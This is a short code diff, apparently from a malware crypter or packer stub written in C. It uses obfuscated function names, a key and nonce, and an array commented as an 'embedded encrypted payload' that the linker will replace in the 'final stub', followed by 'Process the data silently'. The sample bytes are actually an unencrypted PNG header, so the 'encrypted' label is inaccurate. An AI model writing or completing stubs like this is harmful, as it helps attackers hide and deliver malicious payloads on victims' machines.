@@ -146,8 +146,14 @@ int main() {
     xdGvcnvTHsdyv(xoFgmsfFqIOxW(), key);
     xEZRgDsGivHap(xWeLiGdgqljAo(), nonce);
 
-    // Embedded data (will be replaced by linker)
-    uint8_t embeddedData[] = {0x00}; // Placeholder
+    // Embedded encrypted payload data
+    uint8_t embeddedData[] = {
+        0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,  // Example encrypted data
+        0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,  // This would be replaced
+        0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x10,  // with actual encrypted
+        0x08, 0x06, 0x00, 0x00, 0x00, 0x1f, 0xf3, 0xff,  // payload by the linker
+        0x61, 0x00, 0x00, 0x00, 0x19, 0x74, 0x45, 0x58   // when building final stub
+    };
     const size_t embeddedDataSize = sizeof(embeddedData);
 
     // Process the data silently
